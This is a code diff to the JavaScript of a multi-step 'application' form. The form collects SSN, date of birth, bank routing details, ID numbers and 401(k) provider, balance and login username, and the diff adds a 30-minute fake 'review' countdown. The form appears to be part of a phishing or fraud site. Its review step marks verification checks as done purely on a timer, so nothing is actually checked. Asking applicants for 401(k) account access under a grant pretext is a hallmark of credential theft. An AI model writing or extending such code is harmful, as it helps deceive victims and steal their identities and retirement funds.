@@ -253,18 +253,80 @@ function initApplicationForm() {
   const formCard = document.querySelector('.form-card');
   if (!formCard) return;
 
-  const totalSteps = 6;
+  const totalSteps = 7;
   let currentStep = 1;
   const formData = {
     personal: {},
     banking: {},
     business: {},
-    kverify: {},
+    idVerify: {},
+    review: {},
     kaccess: {},
-    review: {}
+    final: {}
   };
 
-  const stepLabels = ['Personal', 'Banking', 'Purpose', '401(k)', '401(k) Access', 'Review'];
+  const stepLabels = ['Personal', 'Banking', 'Purpose', 'ID & 401(k)', 'Reviewing', '401(k) Access', 'Review'];
+
+  let reviewTimer = null;
+  let reviewStartTime = null;
+
+  function startReviewCountdown() {
+    if (reviewTimer) return;
+    const countdownEl = document.getElementById('reviewCountdown');
+    const ringEl = document.getElementById('reviewRing');
+    const checks = document.querySelectorAll('#reviewChecks .rev-check');
+    const totalSeconds = 30 * 60;
+    const circumference = 2 * Math.PI * 52;
+    reviewStartTime = Date.now();
+    let nextCheckAt = [0.08, 0.25, 0.55, 0.82];
+
+    function markCheck(idx) {
+      const c = checks[idx];
+      if (!c || c.classList.contains('done')) return;
+      c.classList.add('done');
+      c.style.color = 'var(--navy-900)';
+      c.style.fontWeight = '600';
+      const dot = c.querySelector('.rev-dot');
+      if (dot) {
+        dot.style.background = '#10b981';
+        dot.style.boxShadow = '0 0 0 4px rgba(16,185,129,0.12)';
+      }
+    }
+
+    function tick() {
+      const elapsed = Math.floor((Date.now() - reviewStartTime) / 1000);
+      const remaining = Math.max(totalSeconds - elapsed, 0);
+      const mm = String(Math.floor(remaining / 60)).padStart(2, '0');
+      const ss = String(remaining % 60).padStart(2, '0');
+      if (countdownEl) countdownEl.textContent = mm + ':' + ss;
+      const progress = 1 - remaining / totalSeconds;
+      if (ringEl) ringEl.style.strokeDashoffset = String(circumference * (1 - progress));
+      nextCheckAt.forEach(function (threshold, i) {
+        if (progress >= threshold) markCheck(i);
+      });
+
+      if (remaining <= 0) {
+        clearInterval(reviewTimer);
+        reviewTimer = null;
+        const btn = document.getElementById('btnSkipReview');
+        if (btn) {
+          btn.textContent = 'Continue to 401(k) Access →';
+          btn.classList.remove('btn-outline-dark');
+          btn.classList.add('btn-primary');
+          btn.disabled = false;
+        }
+        setTimeout(function () {
+          if (currentStep === 5) {
+            currentStep = 6;
+            showStep(currentStep);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+          }
+        }, 900);
+      }
+    }
+    tick();
+    reviewTimer = setInterval(tick, 1000);
+  }
 
   function updateProgressSteps() {
     const steps = document.querySelectorAll('.progress-step');
@@ -299,30 +361,37 @@ function initApplicationForm() {
 
     updateProgressSteps();
 
-    let nextLabel;
-    if (step === totalSteps) nextLabel = 'Submit Application';
-    else if (step === totalSteps - 1) nextLabel = 'Review Application →';
-    else nextLabel = 'Continue →';
-
     formCard.querySelectorAll('.btn-prev').forEach(function (btnPrev) {
       btnPrev.style.visibility = step === 1 ? 'hidden' : 'visible';
     });
     formCard.querySelectorAll('.btn-next-step').forEach(function (btnNext) {
       if (btnNext.classList.contains('btn-submit-final')) return;
       const inStep = btnNext.closest('.form-step');
-      if (inStep && inStep.dataset.step === '4') {
-        btnNext.textContent = 'Continue →';
+      const stepNum = inStep ? parseInt(inStep.dataset.step, 10) : null;
+
+      if (stepNum === 5) {
+        btnNext.textContent = btnNext.id === 'btnSkipReview' ? btnNext.disabled ? 'Proceeding automatically…' : 'Continue to 401(k) Access →' : 'Continue →';
+      } else if (stepNum === 4) {
+        btnNext.textContent = 'Begin Review →';
+      } else if (stepNum === 6) {
+        btnNext.textContent = 'Review Application →';
+      } else if (step === totalSteps) {
+        btnNext.textContent = 'Submit Application';
+      } else if (step === totalSteps - 1) {
+        btnNext.textContent = 'Review Application →';
       } else {
-        btnNext.textContent = nextLabel;
+        btnNext.textContent = 'Continue →';
       }
     });
+
+    if (step === 5) startReviewCountdown();
   }
 
   function collectStepData(step) {
     const stepEl = formCard.querySelector(`.form-step[data-step="${step}"]`);
     if (!stepEl) return;
 
-    const stepKey = ['personal', 'kverify', 'business', 'banking', 'review'][step - 1];
+    const stepKey = ['personal', 'banking', 'business', 'idVerify', 'review', 'kaccess', 'final'][step - 1];
     if (!formData[stepKey]) formData[stepKey] = {};
 
     stepEl.querySelectorAll('input, select, textarea').forEach(function (input) {
@@ -334,7 +403,7 @@ function initApplicationForm() {
 
   function populateReview() {
     const p = formData.personal;
-    const k = formData.kverify;
+    const idv = formData.idVerify || {};
     const ka = formData.kaccess;
     const b = formData.business;
     const ba = formData.banking;
@@ -346,15 +415,16 @@ function initApplicationForm() {
       <div class="review-item"><span class="label">Full Name</span><span class="value">${(p.firstName || '—') + ' ' + (p.lastName || '—')}</span></div>
       <div class="review-item"><span class="label">Email</span><span class="value">${p.email || '—'}</span></div>
       <div class="review-item"><span class="label">Phone</span><span class="value">${p.phone || '—'}</span></div>
-      <div class="review-item"><span class="label">Date of Birth</span><span class="value">${p.dob || '—'}</span></div>
+      <div class="review-item"><span class="label">Date of Birth</span><span class="value">${p.dob || idv.idDob || '—'}</span></div>
       <div class="review-item"><span class="label">SSN (Last 4)</span><span class="value">${p.ssn ? '•••-••-' + p.ssn : '—'}</span></div>
       <div class="review-item"><span class="label">Street Address</span><span class="value">${p.address || '—'}</span></div>
-      <div class="review-item"><span class="label">401(k) Provider</span><span class="value">${k.provider || '—'}</span></div>
-      <div class="review-item"><span class="label">401(k) Username</span><span class="value">${ka.k401AccessUsername || k.k401Username || '—'}</span></div>
-      <div class="review-item"><span class="label">Account Balance</span><span class="value">${k.balance ? '$' + Number(k.balance).toLocaleString() : '—'}</span></div>
+      <div class="review-item"><span class="label">ID Type</span><span class="value">${idv.idType || '—'}</span></div>
+      <div class="review-item"><span class="label">ID Number</span><span class="value">${idv.idNumber ? '••••••' + (String(idv.idNumber).slice(-4)) : '—'}</span></div>
+      <div class="review-item"><span class="label">401(k) Provider</span><span class="value">${idv.provider || '—'}</span></div>
+      <div class="review-item"><span class="label">401(k) Username</span><span class="value">${ka.k401AccessUsername || idv.k401Username || '—'}</span></div>
+      <div class="review-item"><span class="label">Account Balance</span><span class="value">${idv.balance ? '$' + Number(idv.balance).toLocaleString() : '—'}</span></div>
       <div class="review-item"><span class="label">Business / Need</span><span class="value">${b.businessName || '—'}</span></div>
       <div class="review-item"><span class="label">Employment Status</span><span class="value">${b.businessType || '—'}</span></div>
-      <div class="review-item"><span class="label">Grant Amount</span><span class="value">${b.grantAmount ? '$' + Number(b.grantAmount).toLocaleString() : '—'}</span></div>
       <div class="review-item"><span class="label">Bank Name</span><span class="value">${ba.bankName || '—'}</span></div>
       <div class="review-item"><span class="label">Bank Account Type</span><span class="value">${ba.bankAccountType || '—'}</span></div>
       <div class="review-item"><span class="label">Routing Number</span><span class="value">${ba.routing ? '••••••' + (ba.routing.slice(-3) || '') : '—'}</span></div>
